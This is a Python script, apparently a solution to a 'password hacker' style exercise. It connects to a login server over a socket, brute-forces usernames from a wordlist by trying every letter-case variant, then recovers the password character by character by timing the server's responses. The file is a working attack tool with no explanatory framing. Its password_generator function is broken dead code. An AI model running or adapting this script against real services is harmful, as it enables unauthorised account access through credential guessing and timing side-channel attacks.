import sys
import socket
import itertools
import string
import json
import time


def letter_spliter(word):
    """split a given word into a list with other lists
    that contain a letter in lowercase and uppercase for
    each letter of the given word.
    ex: word -> [[w, W], [o, O], [r, R], [d, D]]"""

    letters = [[letter.lower(), letter.upper()] for letter in word]
    return letters


def login_sender(mss):
    """Receives a word and send all its variations of lower and uppercase
    letters combination to the server.
    Returns the right login and the server response."""

    for word in itertools.product(*letter_spliter(mss)):
        message = {"login": ''.join(word), "password": 'p'}
        message_json = json.dumps(message)
        client_socket.send(message_json.encode())
        response = json.loads(client_socket.recv(1024).decode())
        if response != {'result': 'Wrong login!'}:
            return ''.join(word), response
    return 1, 2


def password_generator():
    """generates a combination of all all characters from a-Z and 0-9"""

    n = 0
    while n < 1:
        characters = (string.ascii_letters + string.digits)
        for word in itertools.product(characters, repeat=n):
            password = ''.join(word)
        n += 1



inp = sys.argv
localhost, port = inp[1], int(inp[2])
address = (localhost, port)

client_socket = socket.socket()
client_socket.connect(address)

with open(r'logins.txt', encoding='utf-8') as f:
    for line in f.read().splitlines():
        m, r = login_sender(line)
        if r == {"result": "Wrong password!"}:
            break

lps = []
response = {'result': 'Wrong password!'}
try:
    while response == {'result': 'Wrong password!'}:
        for character in (string.ascii_letters + string.digits):
            start = time.time()
            message = {"login": m, "password": ''.join(lps) + character}
            message_json = json.dumps(message)
            client_socket.send(message_json.encode())
            response = json.loads(client_socket.recv(1024).decode())
            end = time.time()
            if response != {'result': 'Wrong password!'}:
                print(json.dumps(message))
                break
            if (end - start) > 0.1:
                lps.append(character)
except:
    pass